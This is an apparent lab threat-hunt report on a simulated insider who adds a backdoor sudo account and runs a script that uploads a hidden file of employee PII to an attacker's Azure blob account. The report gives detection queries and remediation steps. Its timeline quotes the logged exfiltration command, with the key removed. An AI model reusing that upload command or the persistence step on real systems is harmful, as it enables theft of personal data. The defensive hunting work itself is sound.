# Threat Hunt Report: PII Exfiltration

---
## Platforms and Languages Leveraged

## Scenario
Company A has recently observed indications that employees' personally identifiable information (PII) may be at risk due to a string of phishing attacks. The types of data potentially exposed include home addresses, email addresses, and phone numbers. This sensitive information is stored on a Linux server in a hidden file, accessible only to users with root or sudo privileges. A recent incident was reported in which an employee was seen tampering with a computer while the root administrator had briefly stepped away. As a result, the company has launched a formal investigation.
In this lab exercise, we’ll simulate a situation where an unauthorized user gains root access to a computer and executes a script. This script performs the following actions:

--
## High Level IoC Plan
* Step 1: DeviceProcessEvents - Security team ran script to detect any instance of file script adding or modifying, script processes that can detect privilege escalations or exfiltration
* Step 2: DeviceNetworkEvents - Detect evidence of exfiltration to blob storage account
* Step 3: DeviceFileEvents - Created files created for the exfiltration



### Steps Taken
Reported to the security that they heard reports of  fellow employees “messing with computers” and that was a recently phising attempt.  Another employee alerted the security team to investigate a particular computer that had some sensitive information: Workstation1.

### Step 1 - DeviceProcess Events:
 Security team ran script to detect any instance of file script adding or modifying, script processes that can detect privilege escalations or exfiltration

 ```kql
let timePeriodThreshold = ago(3d); // Defines a point in time 3 days ago
let sensitiveGroups = dynamic(["sudo"]); // Add other groups if relevant
DeviceProcessEvents
| where DeviceName contains "Workstation1"
| where Timestamp > timePeriodThreshold
| where InitiatingProcessCommandLine contains "usermod -aG"
| where InitiatingProcessCommandLine has_any (sensitiveGroups) // Checks if the command line contains any of the sensitive group names
| project Timestamp, DeviceName,ActionType, FileName, ProcessCommandLine, FolderPath

```
<img width="975" height="155" alt="image" src="https://github.com/user-attachments/assets/e543b91e-c20f-4a29-a813-b501d25c6863" />


### Step 2 - DeviceNetworkEvents

```kql
let timePeriodThreshold = ago(3d); // Defines a point in time 3 days ago
DeviceNetworkEvents
| where DeviceName contains "Workstation1"
| where Timestamp > timePeriodThreshold
| where InitiatingProcessCommandLine contains "storage blob upload"
```
<img width="975" height="90" alt="image" src="https://github.com/user-attachments/assets/f9d7615b-3eb2-4a71-8913-283288f9626d" />


### Step 3 - DeviceFileEvents
```kql
DeviceFileEvents
| where DeviceName contains "Workstation1"
| where ActionType == "FileCreated"
| project Timestamp, DeviceName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc
```
<img width="975" height="467" alt="image" src="https://github.com/user-attachments/assets/dff32832-a3b6-4a06-ac0f-b7ad524c6103" />


---

## Chronology Event Timeline
1.	Exfiltration script (secret_script.sh) created

Timestamp: 2025-07-01T16:20:57.836748Z
•	Event: The user creates a file called secret_script.sh through the touch command in Linux. 
•	Action: Bash script file created.
•	File Path: /home/jonUser/secret_script.sh
 

2.	Added sudo account “badactor”

Timestamp: 2025-07-01T16:23:45.630917Z
•	Event: User creates another sudo account “badactor” to be used for persistent after script runs and is deleted
•	Action: Malicious user account created
•	Folder Path:   /etc/group
 



3.	Editing Script to Exfiltrate the file to Azure Blob Account

Timestamp: 2025-07-01T16:37:34.385187Z
Event: Editing the script secret_script.sh to upload personal information to his AzureStorage account.  The script will run and then delete itself.
Action: Editing script to include details of Azure storage account
Folder Path: nano secret_script.sh
 




4.	Script Execution and Uploading Files to Azure Blob Storage
•	Timestamp: 2025-07-01T21:24:27.309826Z
•	Event: Script was executed and information was uploaded to bad actors blob storage account
•	Action: After script execution file being uploaded to bad actors cloud account
•	FilePath: /usr/bin/../../opt/az/bin/python3 -Im azure.cli storage blob upload --account-name guysblobstorage --account-key secret key removed
container-name guyscontainer1 --file /home/jonUser/.personal_information/.sensative_info.txt --name exfiltrated_data

---
## Summary

---

## Response Taken
1. Create MDE Alert for future monitoring
<img width="975" height="290" alt="image" src="https://github.com/user-attachments/assets/162f7c38-caf5-42ea-a285-18fd17554e5d" />

2. Find and delete the bad actor sudo account:
   Find sudo user:

    ```
sudo -l -U username
sudo -l -U badactor
```

<img width="975" height="142" alt="image" src="https://github.com/user-attachments/assets/2a6ea557-2cb1-41fd-a13a-694bcc778c53" />

Delete Sudo user:

```
Delete sudo user:
sudo deluser username sudo
```


